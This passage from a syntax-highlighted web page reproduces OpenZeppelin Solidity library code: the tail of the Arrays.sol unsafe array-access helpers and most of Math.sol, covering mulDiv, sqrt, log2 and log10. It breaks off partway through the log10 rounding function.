add(keccak256(<span class="number">0</span>, <span class="number">0x20</span>), pos)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slot.getAddressSlot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Access an array in an &quot;unsafe&quot; way. Skips solidity &quot;index-out-of-range&quot; check.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: Only use if you are certain `pos` is lower than the array length.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">unsafeAccess</span><span class="params">(bytes32[] storage arr, uint256 pos)</span> internal pure <span class="title function_">returns</span> <span class="params">(StorageSlot.Bytes32Slot storage)</span> &#123;</span><br><span class="line">        bytes32 slot;</span><br><span class="line">        <span class="comment">// We use assembly to calculate the storage slot of the element at index `pos` of the dynamic array `arr`</span></span><br><span class="line">        <span class="comment">// following https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(<span class="number">0</span>, arr.slot)</span><br><span class="line">            slot := add(keccak256(<span class="number">0</span>, <span class="number">0x20</span>), pos)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slot.getBytes32Slot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Access an array in an &quot;unsafe&quot; way. Skips solidity &quot;index-out-of-range&quot; check.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: Only use if you are certain `pos` is lower than the array length.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">unsafeAccess</span><span class="params">(uint256[] storage arr, uint256 pos)</span> internal pure <span class="title function_">returns</span> <span class="params">(StorageSlot.Uint256Slot storage)</span> &#123;</span><br><span class="line">        bytes32 slot;</span><br><span class="line">        <span class="comment">// We use assembly to calculate the storage slot of the element at index `pos` of the dynamic array `arr`</span></span><br><span class="line">        <span class="comment">// following https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(<span class="number">0</span>, arr.slot)</span><br><span class="line">            slot := add(keccak256(<span class="number">0</span>, <span class="number">0x20</span>), pos)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slot.getUint256Slot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Math-sol"><a href="#Math-sol" class="headerlink" title="Math.sol"></a>Math.sol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Standard math utilities missing in the Solidity language.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library Math &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Rounding</span> &#123;</span></span><br><span class="line">        Down, <span class="comment">// Toward negative infinity</span></span><br><span class="line">        Up, <span class="comment">// Toward infinity</span></span><br><span class="line">        Zero <span class="comment">// Toward zero</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the largest of two numbers.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">max</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the smallest of two numbers.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">min</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &lt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the average of two numbers. The result is rounded towards</span></span><br><span class="line"><span class="comment">     * zero.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">average</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="comment">// (a + b) / 2 can overflow.</span></span><br><span class="line">        <span class="keyword">return</span> (a &amp; b) + (a ^ b) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the ceiling of the division of two numbers.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This differs from standard division with `/` in that it rounds up instead</span></span><br><span class="line"><span class="comment">     * of rounding down.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">ceilDiv</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="comment">// (a + b - 1) / b can overflow on addition, so we distribute.</span></span><br><span class="line">        <span class="keyword">return</span> a == <span class="number">0</span> ? <span class="number">0</span> : (a - <span class="number">1</span>) / b + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0</span></span><br><span class="line"><span class="comment">     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)</span></span><br><span class="line"><span class="comment">     * with further edits by Uniswap Labs also under MIT license.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">mulDiv</span><span class="params">(uint256 x, uint256 y, uint256 denominator)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256 result)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="comment">// 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use</span></span><br><span class="line">            <span class="comment">// use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256</span></span><br><span class="line">            <span class="comment">// variables such that product = prod1 * 2^256 + prod0.</span></span><br><span class="line">            uint256 prod0; <span class="comment">// Least significant 256 bits of the product</span></span><br><span class="line">            uint256 prod1; <span class="comment">// Most significant 256 bits of the product</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                let mm := mulmod(x, y, not(<span class="number">0</span>))</span><br><span class="line">                prod0 := mul(x, y)</span><br><span class="line">                prod1 := sub(sub(mm, prod0), lt(mm, prod0))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Handle non-overflow cases, 256 by 256 division.</span></span><br><span class="line">            <span class="keyword">if</span> (prod1 == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> prod0 / denominator;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Make sure the result is less than 2^256. Also prevents denominator == 0.</span></span><br><span class="line">            require(denominator &gt; prod1, <span class="string">&quot;Math: mulDiv overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">///////////////////////////////////////////////</span></span><br><span class="line">            <span class="comment">// 512 by 256 division.</span></span><br><span class="line">            <span class="comment">///////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Make division exact by subtracting the remainder from [prod1 prod0].</span></span><br><span class="line">            uint256 remainder;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                <span class="comment">// Compute remainder using mulmod.</span></span><br><span class="line">                remainder := mulmod(x, y, denominator)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Subtract 256 bit number from 512 bit number.</span></span><br><span class="line">                prod1 := sub(prod1, gt(remainder, prod0))</span><br><span class="line">                prod0 := sub(prod0, remainder)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always &gt;= 1.</span></span><br><span class="line">            <span class="comment">// See https://cs.stackexchange.com/q/138556/92363.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Does not overflow because the denominator cannot be zero at this stage in the function.</span></span><br><span class="line">            uint256 twos = denominator &amp; (~denominator + <span class="number">1</span>);</span><br><span class="line">            assembly &#123;</span><br><span class="line">                <span class="comment">// Divide denominator by twos.</span></span><br><span class="line">                denominator := div(denominator, twos)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Divide [prod1 prod0] by twos.</span></span><br><span class="line">                prod0 := div(prod0, twos)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.</span></span><br><span class="line">                twos := add(div(sub(<span class="number">0</span>, twos), twos), <span class="number">1</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Shift in bits from prod1 into prod0.</span></span><br><span class="line">            prod0 |= prod1 * twos;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such</span></span><br><span class="line">            <span class="comment">// that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for</span></span><br><span class="line">            <span class="comment">// four bits. That is, denominator * inv = 1 mod 2^4.</span></span><br><span class="line">            uint256 inverse = (<span class="number">3</span> * denominator) ^ <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel&#x27;s lifting lemma, this also works</span></span><br><span class="line">            <span class="comment">// in modular arithmetic, doubling the correct bits in each step.</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^8</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^16</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^32</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^64</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^128</span></span><br><span class="line">            inverse *= <span class="number">2</span> - denominator * inverse; <span class="comment">// inverse mod 2^256</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Because the division is now exact we can divide by multiplying with the modular inverse of denominator.</span></span><br><span class="line">            <span class="comment">// This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is</span></span><br><span class="line">            <span class="comment">// less than 2^256, this is the final result. We don&#x27;t need to compute the high bits of the result and prod1</span></span><br><span class="line">            <span class="comment">// is no longer required.</span></span><br><span class="line">            result = prod0 * inverse;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">mulDiv</span><span class="params">(uint256 x, uint256 y, uint256 denominator, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = mulDiv(x, y, denominator);</span><br><span class="line">        <span class="keyword">if</span> (rounding == Rounding.Up &amp;&amp; mulmod(x, y, denominator) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Inspired by Henry S. Warren, Jr.&#x27;s &quot;Hacker&#x27;s Delight&quot; (Chapter 11).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">sqrt</span><span class="params">(uint256 a)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// We know that the &quot;msb&quot; (most significant bit) of our target number `a` is a power of 2 such that we have</span></span><br><span class="line">        <span class="comment">// `msb(a) &lt;= a &lt; 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// This can be rewritten `2**log2(a) &lt;= a &lt; 2**(log2(a) + 1)`</span></span><br><span class="line">        <span class="comment">// → `sqrt(2**k) &lt;= sqrt(a) &lt; sqrt(2**(k+1))`</span></span><br><span class="line">        <span class="comment">// → `2**(k/2) &lt;= sqrt(a) &lt; 2**((k+1)/2) &lt;= 2**(k/2 + 1)`</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.</span></span><br><span class="line">        uint256 result = <span class="number">1</span> &lt;&lt; (log2(a) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,</span></span><br><span class="line">        <span class="comment">// since it is the square root of a uint256. Newton&#x27;s method converges quadratically (precision doubles at</span></span><br><span class="line">        <span class="comment">// every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision</span></span><br><span class="line">        <span class="comment">// into the expected uint128 result.</span></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            result = (result + a / result) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> min(result, a / result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @notice Calculates sqrt(a), following the selected rounding direction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">sqrt</span><span class="params">(uint256 a, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = <span class="built_in">sqrt</span>(a);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; result * result &lt; a ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 2, rounded down, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log2</span><span class="params">(uint256 value)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">128</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">128</span>;</span><br><span class="line">                result += <span class="number">128</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">64</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">64</span>;</span><br><span class="line">                result += <span class="number">64</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">32</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">32</span>;</span><br><span class="line">                result += <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">16</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">                result += <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">8</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">                result += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">4</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">                result += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">2</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">                result += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">1</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                result += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log2</span><span class="params">(uint256 value, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = log2(value);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; <span class="number">1</span> &lt;&lt; result &lt; value ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 10, rounded down, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log10</span><span class="params">(uint256 value)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">64</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">64</span>;</span><br><span class="line">                result += <span class="number">64</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">32</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">32</span>;</span><br><span class="line">                result += <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">16</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">16</span>;</span><br><span class="line">                result += <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">8</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">8</span>;</span><br><span class="line">                result += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">4</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">4</span>;</span><br><span class="line">                result += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">2</span>) &#123;</span><br><span class="line">                value /= <span class="number">10</span> ** <span class="number">2</span>;</span><br><span class="line">                result += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;= <span class="number">10</span> ** <span class="number">1</span>) &#123;</span><br><span class="line">                result += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log10</span><span class="params">(uint256 value, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            